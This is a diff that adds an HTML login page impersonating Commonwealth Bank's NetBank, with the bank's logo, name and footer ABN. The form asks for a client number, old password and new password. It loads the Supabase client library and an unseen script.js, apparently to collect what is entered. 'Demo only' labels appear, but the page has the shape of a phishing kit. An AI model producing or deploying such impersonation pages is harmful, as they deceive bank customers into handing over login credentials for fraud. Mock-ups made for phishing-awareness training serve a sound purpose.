@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Demo NetBank Login</title>
+    <link rel="stylesheet" href="styles.css">
+  </head>
+  <body>
+    <main class="page-shell" aria-label="Demo banking login page">
+      <header class="brand">
+        <img src="logo.jpg" alt="Commonwealth Bank logo" class="brand-mark">
+        <span class="brand-name">Commonwealth Bank</span>
+      </header>
+
+      <section class="top-grid" aria-label="Login and support">
+        <form class="panel login-panel" id="demo-login">
+          <h1>NetBank</h1>
+
+          <div class="form-row">
+            <label for="client-number">Client number</label>
+            <input id="client-number" name="client-number" inputmode="numeric" autocomplete="off">
+          </div>
+
+          <div class="form-row">
+            <label for="old-password">Old Password</label>
+            <input id="old-password" name="old-password" type="password" autocomplete="off">
+          </div>
+
+          <div class="form-row">
+            <label for="new-password">New Password</label>
+            <input id="new-password" name="new-password" type="password" autocomplete="off">
+          </div>
+
+          <label class="remember">
+            <input type="checkbox" aria-label="Remember client number">
+            <span>Remember client number</span>
+          </label>
+
+          <button class="login-button" type="submit">
+            Next ›
+          </button>
+        </form>
+
+        <aside class="side-column" aria-label="Help links">
+          <div class="panel link-panel">
+            <h2>NetBank Support</h2>
+            <div class="panel-body links">
+              <p>Contact for updated security measures</p>
+              <p>Protection for unauthorised transactions</p>
+            </div>
+          </div>
+        </aside>
+      </section>
+
+      <section class="quicklinks" aria-label="Quicklinks">
+      </section>
+
+      <footer class="footer">
+        <span class="copyright">© Commonwealth Bank of Australia 2026 ABN 48 123 123 124</span>
+      </footer>
+    </main>
+
+    <div class="toast" id="toast" role="status" aria-live="polite">Demo only: no login was submitted.</div>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="script.js"></script>
+  </body>
+</html>
